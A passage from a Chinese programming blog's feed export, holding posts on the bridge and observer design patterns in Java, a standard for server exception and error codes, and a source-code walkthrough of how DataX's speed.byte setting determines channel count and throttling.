<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586163074010.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Colour &#123;</span><br><span class="line">    void desc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Blue implements Colour &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;蓝色&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Red implements Colour &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;红色&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Yellow implements Colour</span><br><span class="line">&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;黄色&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public abstract class Graphical &#123;</span><br><span class="line">    private Colour colour;</span><br><span class="line"></span><br><span class="line">    public Graphical(Colour colour) &#123;</span><br><span class="line">        this.colour = colour;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    abstract void desc();</span><br><span class="line">    public Colour getColour()&#123;</span><br><span class="line">        return colour;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Rectangle extends Graphical &#123;</span><br><span class="line"></span><br><span class="line">    public Rectangle(Colour colour)&#123;</span><br><span class="line">      super(colour);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;长方形&quot;);</span><br><span class="line">        getColour().desc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Square extends Graphical &#123;</span><br><span class="line"></span><br><span class="line">    public Square(Colour colour)&#123;</span><br><span class="line">      super(colour);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;正方形&quot;);</span><br><span class="line">        getColour().desc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Triangle extends Graphical &#123;</span><br><span class="line"></span><br><span class="line">    public Triangle(Colour colour) &#123;</span><br><span class="line">        super(colour);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;三角形&quot;);</span><br><span class="line">        getColour().desc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Rectangle rectangle = new Rectangle(new Blue());</span><br><span class="line">        rectangle.desc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586164465035.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol>
<li>解耦解耦解耦解耦解耦解耦解耦</li>
<li>实现细节对客户透明，可以对用户隐藏实现细节</li>
</ol>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 行为型模式 观察者模式</title>
    <url>//2020/09/14/%E3%80%90%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%20%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>观察者模式又叫发布订阅模式,拥有一个监听者,如果一个被监听者发生了改变则会通知到所有监听者。例子,警察和嫌疑犯之间就是观察者模式。微信朋友圈,相对于好友,你就是观察者,微信好友发送朋友圈你会收到通知</p>
<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586165515592.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class PoliceMan &#123;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public PoliceMan(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void name() &#123;</span><br><span class="line">        System.out.println(&quot;我是:&quot; + name + &quot;收到消息&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class XianFan1 &#123;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public XianFan1(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private List&lt;PoliceMan&gt; policeManList = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    public void addPolice(PoliceMan policeMan) &#123;</span><br><span class="line">        if (!policeManList.contains(policeMan)) &#123;</span><br><span class="line">            policeManList.add(policeMan);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        System.out.println(name + &quot;跑了&quot;);</span><br><span class="line">        notifyAllPoliceMan();</span><br><span class="line">    &#125;</span><br><span class="line">    public void notifyAllPoliceMan()&#123;</span><br><span class="line">        policeManList.stream().forEach(i -&gt; i.name());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        PoliceMan policeManA =new PoliceMan(&quot;警察:A&quot;);</span><br><span class="line">        PoliceMan policeManB =new PoliceMan(&quot;警察:B&quot;);</span><br><span class="line">        PoliceMan policeManC =new PoliceMan(&quot;警察:C&quot;);</span><br><span class="line">        XianFan1 xianFan1 =new XianFan1(&quot;嫌犯1&quot;);</span><br><span class="line">        xianFan1.addPolice(policeManA);</span><br><span class="line">        xianFan1.addPolice(policeManB);</span><br><span class="line">        xianFan1.addPolice(policeManC);</span><br><span class="line">        xianFan1.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586166152531.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可以看到在被观察者类上面存放观察者的集合,在调用观察者的相关方法的时候循环调用观察者,从而实现发布订阅模式。<br>被观察者需要提供添加观察者和通知观察者方法</p>
<ul>
<li>观察者和被观察者的实现复合开闭原则</li>
<li>实现通知模式</li>
<li>如果观察者过多通知的时间成本加大</li>
<li>观察者只知道目标变化,但是具体变化情况不得而知。可以定义相关事件来区分</li>
</ul>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>项目规范 对于服务异常和错误码规范的总结</title>
    <url>//2020/10/02/%E9%A1%B9%E7%9B%AE%E8%A7%84%E8%8C%83%20%E5%AF%B9%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%BC%82%E5%B8%B8%E5%92%8C%E9%94%99%E8%AF%AF%E7%A0%81%E8%A7%84%E8%8C%83%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="服务异常和错误码规范"><a href="#服务异常和错误码规范" class="headerlink" title="服务异常和错误码规范"></a>服务异常和错误码规范</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>  目前公司的服务端返回的异常不规范,导致接口各个场景返回的异常不统一,使得项目不好维护。并且代码看起来不优雅,目前公司项目遇到了国际化的问题,服务端的异常也需要做出相关调整。所以对服务端的异常错误码制定一个规范。</p>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><ul>
<li>需要制定那些异常？</li>
<li>错误码如何设计？如何做到可读性、可维护、灵活可控？</li>
<li>新的异常规范,如何设计才会对当前项目侵入性小？</li>
</ul>
<h4 id="异常分类"><a href="#异常分类" class="headerlink" title="异常分类"></a>异常分类</h4><p>  根据之前的工作经验,异常分为两个大分类,<strong>未知异常</strong>、<strong>已知异常</strong>,结合这两个分类对异常进行拆分,直到拆分到不能拆分为止。拆分结果如下：</p>
<figure class="legacy-image-notice" data-original-src="https://qingqing-test.oss-cn-qingdao.aliyuncs.com/simba/%E5%BC%82%E5%B8%B8%E5%88%86%E7%B1%BB.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<blockquote>
<p>异常拆分一定要结合整体服务业务,有些公司服务的异常可能其他公司永远都用不上。比如电商的项目有些异常场景可能做crm系统的永远用不上。所以不要盲目借鉴。</p>
</blockquote>
<h3 id="异常介绍"><a href="#异常介绍" class="headerlink" title="异常介绍"></a>异常介绍</h3><ul>
<li><p>未知异常<br>未知异常指的是服务端不可感知和控制的异常,如引入的jar包中抛出的异常,或者数据库链接异常,或者代码bug出现的空指针异常和badsql,这些异常是服务端可能出现的情况,上面列举的几个场景也确实是服务器异常,所以针对这种情况,服务端接口返回的http状态码是500 无需将相关异常栈信息返回,增加代码安全性。</p>
<blockquote>
<p>这里指的安全性是比如写了一个badsql 如果把异常栈抛出去则会导致数据表泄漏</p>
</blockquote>
</li>
<li><p>已知异常<br>已知异常是服务端知道可能出现异常的场景,目前拆分为<strong>前置异常</strong>、<strong>外部异常</strong>、<strong>自定义异常</strong>,对于这些异常http状态码是200,并且可以返回响应的错误信息,具体描述如下</p>
<ol>
<li>前置异常：指的是代码还没有到真正业务逻辑前抛出的异常,比如<strong>参数校验失败异常</strong>、<strong>用户没有权限异常</strong>、<strong>token过期异常</strong>、<strong>未找到资源异常</strong> 等等，</li>
<li>外部异常：指的是因为外部因素导致的接口异常而非正常业务逻辑错误或者数据错误导致的,比如<strong>第三方服务商异常</strong>、<strong>接口被限流</strong>、<strong>接口重复请求</strong></li>
<li>自定义异常：指的是程序员自己抛出来的异常，这种异常是因为代码在相关业务逻辑中，不满足业务条件并且必须手动抛出的异常，比如:子表记录找不到对应父表的记录,这种正常逻辑是不可能存在场景,是需要手动抛出异常进行排查的并且这种问题你也没办法兼容。或者举行一个秒杀活动，在活动未开始之前就有请求到服务端了，这是不现实的情况,并且于这种场景需要以来服务端的响应作出对应的展示文案，所有服务端需要自定义相关的异常返回,前段解析相关的错误码作出相关的文案展示。对于这种异常称作自定义异常。</li>
</ol>
</li>
</ul>
<h3 id="错误码的设计"><a href="#错误码的设计" class="headerlink" title="错误码的设计"></a>错误码的设计</h3><h4 id="错误码的作用"><a href="#错误码的作用" class="headerlink" title="错误码的作用"></a>错误码的作用</h4><ol>
<li>程序员根据错误码能够快速定位问题</li>
<li>通过不同的错误码可以区分出是什么原因导致的问题(传参错误，没有权限，服务异常)</li>
<li><strong>明确清晰</strong>的展示错误信息，方便程序员快速定位问题</li>
</ol>
<h4 id="错误码的定义"><a href="#错误码的定义" class="headerlink" title="错误码的定义"></a>错误码的定义</h4><ol>
<li>数字类型error_code标识<ul>
<li>长度可控,节省传输带宽</li>
<li>可读性差,需要相关文档</li>
<li>数字范围分段,表示不通分类,不同业务的异常</li>
</ul>
</li>
<li>字符串类型的error_code标识<ul>
<li>长度稍长</li>
<li>可读性高,见名知意</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;error_code&#x27;:401,</span><br><span class="line">    &#x27;error_str_code&#x27;:&#x27;UnAuthorized&#x27;,</span><br><span class="line">    &#x27;error_msg&#x27;:&#x27;user un Authorized: user_id:&#123;xxx&#125;&#x27;,</span><br><span class="line">    &#x27;error_reason&#x27;:&#x27;用户未授权&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="错误码枚举伪代码"><a href="#错误码枚举伪代码" class="headerlink" title="错误码枚举伪代码"></a>错误码枚举伪代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface ErrorCodeInterface &#123;</span><br><span class="line"></span><br><span class="line">    Integer getErrorCode();</span><br><span class="line"></span><br><span class="line">    String getStrErrorCode();</span><br><span class="line"></span><br><span class="line">    String getMsg();</span><br><span class="line"></span><br><span class="line">    String getReason();</span><br><span class="line">&#125;</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">public enum xxxxErrorCode implements ErrorCodeInterface&#123;</span><br><span class="line"></span><br><span class="line">    ENCODE_SDK_LICENSE_OVERDUE(1001, &quot;ActivityNotStarted&quot;, &quot;Current Activity not started&quot;,&quot;当前活动暂未开始&quot;),</span><br><span class="line"></span><br><span class="line">    Integer errorCode;</span><br><span class="line">    String  strErrorCode;</span><br><span class="line">    String  msg;</span><br><span class="line">    String reason ;</span><br><span class="line">    @Override</span><br><span class="line">    public Integer getErrorCode() &#123;</span><br><span class="line">        return errorCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getMsg() &#123;</span><br><span class="line">        return msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getStrMsg() &#123;</span><br><span class="line">        return strMsg;</span><br><span class="line">    &#125;</span><br><span class="line">     @Override</span><br><span class="line">    public String getReason() &#123;</span><br><span class="line">        return reason;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="异常伪代码"><a href="#异常伪代码" class="headerlink" title="异常伪代码"></a>异常伪代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class DataSimbaRuntimeException extends RuntimeException &#123;</span><br><span class="line"></span><br><span class="line">    private String reason;</span><br><span class="line"></span><br><span class="line">    public DataSimbaRuntimeException(String msg) &#123;</span><br><span class="line">        this(msg, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public DataSimbaRuntimeException(String msg, Throwable cause) &#123;</span><br><span class="line">        this(msg, &quot;&quot;, cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public DataSimbaRuntimeException(String msg, String reason) &#123;</span><br><span class="line">        super(msg);</span><br><span class="line">        this.reason = reason;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public DataSimbaRuntimeException(String msg, String reason, Throwable cause) &#123;</span><br><span class="line">        super(msg, cause);</span><br><span class="line">        this.reason = reason;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getReason() &#123;</span><br><span class="line">        return this.reason == null ? &quot;&quot; : this.reason;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/***</span><br><span class="line"> * 请求校验异常</span><br><span class="line"> */</span><br><span class="line">public class RequestValidateException extends DataSimbaRuntimeException &#123;</span><br><span class="line"></span><br><span class="line">   public RequestValidateException(String msg, Throwable cause) &#123;</span><br><span class="line">        super(msg, cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public RequestValidateException(String msg) &#123;</span><br><span class="line">        super(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public RequestValidateException(String msg, String reason) &#123;</span><br><span class="line">        super(msg, reason);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public RequestValidateException(String msg, String reason, Throwable cause) &#123;</span><br><span class="line">        super(msg, reason, cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/***</span><br><span class="line"> * 没有权限异常</span><br><span class="line"> */</span><br><span class="line">public class UnAuthorizedException extends DataSimbaRuntimeException &#123;</span><br><span class="line"></span><br><span class="line">   public UnAuthorizedException(String msg, Throwable cause) &#123;</span><br><span class="line">        super(msg, cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public UnAuthorizedException(String msg) &#123;</span><br><span class="line">        super(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public UnAuthorizedException(String msg, String reason) &#123;</span><br><span class="line">        super(msg, reason);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public UnAuthorizedException(String msg, String reason, Throwable cause) &#123;</span><br><span class="line">        super(msg, reason, cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="如何应用和error-code-约定"><a href="#如何应用和error-code-约定" class="headerlink" title="如何应用和error_code 约定"></a>如何应用和error_code 约定</h4><ol>
<li><p>比如 请求参数不对,需要抛出请求参数异常则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new RequestValidateException(&quot;lack of user id&quot;,&quot;lack of user id&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在服务端创建异常拦截器,对异常统一处理</p>
</li>
<li><p>对于未知异常,http状态码是500, 已知异常和自定义异常http状态码为200</p>
</li>
<li><p>前置异常 error_code :400～499</p>
</li>
<li><p>外部异常 error_code :600～699</p>
</li>
<li><p>自定义异常 不同的自定义error_code长度从都从1000开始,如果业务需要可以跳号到2000或者到3000开始等等</p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>    本次整理服务端异常和错误码的规范结合了之前工作的经验,回想了开发以来出现的异常场景,之前工作中虽然熟知如何合理的抛出异常,但是大前提是一个团队需要对异常作出响应的规范，如果没有规范每个人都抛出自己方式的异常，对于前端展示和问题排查都是非常不友好的，并且不够灵活，比如目前工作中遇到的国际化问题，必须服务端的异常非常准确,后面做国际化才能非常简单。</p>
]]></content>
      <categories>
        <category>项目规范</category>
      </categories>
      <tags>
        <tag>项目规范</tag>
        <tag>错误码</tag>
      </tags>
  </entry>
  <entry>
    <title>DataX 的 speed.byte 为什么越调越怪：顺着源码把限速链路走一遍</title>
    <url>//2020/11/13/datax-throughput-control/</url>
    <content><![CDATA[<p>DataX 任务跑慢了，很多人的第一反应是把 <code>job.setting.speed.byte</code> 往上调。这个动作有时有效，有时一点反应都没有，偶尔还会把目标库写得更慢。</p>
<p>问题出在我们很容易把它理解成一个总限速开关。DataX 启动前会用速度预算计算 Channel 数量，运行中再由每个 Channel 统计吞吐并决定要不要休眠。Reader 和 Writer 之间还有一个有界队列。任何一环跟不上，都会把前后两端拖住。</p>
<p>下面的代码基于 DataX 提交 <code>30842ca</code>，提交时间是 2020 年 11 月 9 日。这样可以避开后来版本的改动，也和这篇笔记的时间对得上。</p>
<p class="article-diagram-scroll"><img src="/images/articles/datax-throughput-chain.svg" class="lazyload" data-srcset="/images/articles/datax-throughput-chain.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="DataX 从速度预算到运行时背压的链路"></p>
<span id="more"></span>

<h2 id="byte-和-channel-不是两个同时生效的旋钮"><a href="#byte-和-channel-不是两个同时生效的旋钮" class="headerlink" title="byte 和 channel 不是两个同时生效的旋钮"></a><code>byte</code> 和 <code>channel</code> 不是两个同时生效的旋钮</h2><p>先看一段常见配置：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;job&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;setting&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;speed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;byte&quot;</span><span class="punctuation">:</span> <span class="number">33554432</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;record&quot;</span><span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;channel&quot;</span><span class="punctuation">:</span> <span class="number">8</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>直觉上，这是“总速度 32 MB&#x2F;s，并发 8”。源码不是这么解释的。</p>
<p><code>JobContainer.adjustChannelNumber()</code> 先检查 <code>byte</code> 和 <code>record</code>。只要其中一个启用，DataX 就用 Job 总速度除以单 Channel 速度，算出需要多少个 Channel。此时 JSON 里的 <code>speed.channel</code> 不参与计算。只有 <code>byte</code>、<code>record</code> 都没有启用，<code>speed.channel</code> 才是直接指定的并发数。</p>
<p>这里还藏着另一份配置：<code>core.transport.channel.speed</code>。它在 <code>core.json</code> 里，管的是单个 Channel，而任务 JSON 里的 <code>job.setting.speed</code> 管整个 Job。</p>
<table>
<thead>
<tr>
<th>配置项</th>
<th>它管什么</th>
</tr>
</thead>
<tbody><tr>
<td><code>job.setting.speed.byte</code></td>
<td>Job 每秒允许传输的总字节数，同时用于推导 Channel 数</td>
</tr>
<tr>
<td><code>job.setting.speed.record</code></td>
<td>Job 每秒允许传输的总记录数，同时用于推导 Channel 数</td>
</tr>
<tr>
<td><code>job.setting.speed.channel</code></td>
<td>没有配置 byte、record 时，直接指定 Channel 数</td>
</tr>
<tr>
<td><code>core.transport.channel.speed.byte</code></td>
<td>单个 Channel 的字节速度上限</td>
</tr>
<tr>
<td><code>core.transport.channel.speed.record</code></td>
<td>单个 Channel 的记录速度上限</td>
</tr>
</tbody></table>
<p>所以，任务里写了 32 MB&#x2F;s，核心配置却没有单 Channel 上限，DataX 没法完成除法，会直接报配置错误。这个地方不能只看任务 JSON。</p>
<h2 id="32-MB-s-为什么最后只启动-6-个-Channel"><a href="#32-MB-s-为什么最后只启动-6-个-Channel" class="headerlink" title="32 MB&#x2F;s 为什么最后只启动 6 个 Channel"></a>32 MB&#x2F;s 为什么最后只启动 6 个 Channel</h2><p><code>adjustChannelNumber()</code> 的计算可以压成几行：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">channelByByte   = max(1, jobByteSpeed / channelByteSpeed)</span><br><span class="line">channelByRecord = max(1, jobRecordSpeed / channelRecordSpeed)</span><br><span class="line">needChannel     = min(channelByByte, channelByRecord)</span><br></pre></td></tr></table></figure>

<p>除法是整数除法。总速度 32 MB&#x2F;s，单 Channel 3 MB&#x2F;s，算出来是 10 个 Channel，不会四舍五入成 11。</p>
<p>但 10 仍然不一定是最后的并发数。Reader 和 Writer 完成 <code>split()</code> 后，如果一共只生成了 6 个 Task，<code>schedule()</code> 还会做一次截断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.needChannelNumber = Math.min(<span class="built_in">this</span>.needChannelNumber, taskNumber);</span><br></pre></td></tr></table></figure>

<p>结果就是 6。继续把 <code>speed.byte</code> 从 32 MB&#x2F;s 加到 64 MB&#x2F;s，运行日志里的 Channel 数可能纹丝不动。卡住它的不是速度预算，而是 Task 数量。此时该查 Reader 的切分键、切分范围和最终任务数，而不是继续改 <code>speed.byte</code>。</p>
<p><code>byte</code> 和 <code>record</code> 同时打开时也一样，DataX 分别算一遍，取较小值。字节预算允许 10 个 Channel，记录数预算只允许 4 个，最后就是 4 个。</p>
<h2 id="真正的限速发生在-push-之后"><a href="#真正的限速发生在-push-之后" class="headerlink" title="真正的限速发生在 push 之后"></a>真正的限速发生在 <code>push</code> 之后</h2><p>Channel 的调用顺序值得单独看。<code>push()</code> 会先执行 <code>doPush()</code>，成功后才调用 <code>statPush()</code>，所以并非先判断速度再写队列：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="keyword">final</span> Record r)</span> &#123;</span><br><span class="line">    Validate.notNull(r, <span class="string">&quot;record不能为空.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.doPush(r);</span><br><span class="line">    <span class="built_in">this</span>.statPush(<span class="number">1L</span>, r.getByteSize());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到了 <code>statPush()</code>，DataX 会比较当前时间和上次统计时间。只有间隔达到 <code>flowControlInterval</code>，才重新计算本窗口的字节速度与记录速度。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">currentByteSpeed = byteDelta * 1000 / intervalMs</span><br><span class="line">sleepMs = currentByteSpeed * intervalMs / byteLimit - intervalMs</span><br></pre></td></tr></table></figure>

<p>如果 byte 和 record 都超限，两边各算一个休眠时间，取较大的那个。这套实现采用“采样一段，再睡一会儿”的方式，并非连续、平滑的令牌桶。数据库监控里看到锯齿并不奇怪，先把监控粒度和 <code>flowControlInterval</code> 对齐再判断。</p>
<p class="article-diagram-scroll"><img src="/images/articles/datax-channel-push-sequence.svg" class="lazyload" data-srcset="/images/articles/datax-channel-push-sequence.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Channel push、队列等待与限流休眠的调用顺序"></p>
<p>还有一个边界经常被忽略：限流发生在 Record 进入 DataX 传输链路以后。它可以压住持续吞吐，不能改变源库执行一条 SQL 的代价。全表扫描已经在数据库里发生了，再准确的 Channel 限速也补不上索引和分区条件。</p>
<h2 id="waitWriterTime-这个名字容易看反"><a href="#waitWriterTime-这个名字容易看反" class="headerlink" title="waitWriterTime 这个名字容易看反"></a><code>waitWriterTime</code> 这个名字容易看反</h2><p>默认的 <code>MemoryChannel</code> 同时限制记录条数和内存字节数。批量 Push 碰到下面任意一种情况，Reader 都要等：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">memoryBytes + batchBytes &gt; byteCapacity</span><br><span class="line">batchRecordCount &gt; queue.remainingCapacity</span><br></pre></td></tr></table></figure>

<p>源码在 <code>doPush()</code>、<code>doPushAll()</code> 里把这段等待记到 <code>waitWriterTime</code>。名字的意思是“等 Writer 腾位置”，不是 Writer 自己花掉的时间。这个指标高，通常说明数据写不出去：目标库提交慢、批次设置不合适、索引维护重，或者网络写入到了上限。</p>
<p>反过来，Writer 从空队列取数据时，等待会累计到 <code>waitReaderTime</code>。它高，应该往 Reader 查：抽取 SQL 慢、分片不均，或者某个切片的数据量远大于其他切片。</p>
<p>我更愿意把这两个值当成方向指示器，而不是最终结论。比如 <code>waitWriterTime</code> 高只能说明下游消化不及上游，具体是数据库锁、事务日志还是网络，要拿目标端监控继续对。仅凭 DataX 日志说“目标库性能差”，证据还不够。</p>
<h2 id="调速度时，我会固定这几个量"><a href="#调速度时，我会固定这几个量" class="headerlink" title="调速度时，我会固定这几个量"></a>调速度时，我会固定这几个量</h2><p>先把数据集、Reader SQL、Writer 批次和运行时段固定。每轮只改 Channel 或速度预算中的一个，记录实际 Channel 数、总吞吐、两个等待时间、源端负载和目标端写入延迟。一次改五个参数，最后只能得到一组碰巧跑完的配置。</p>
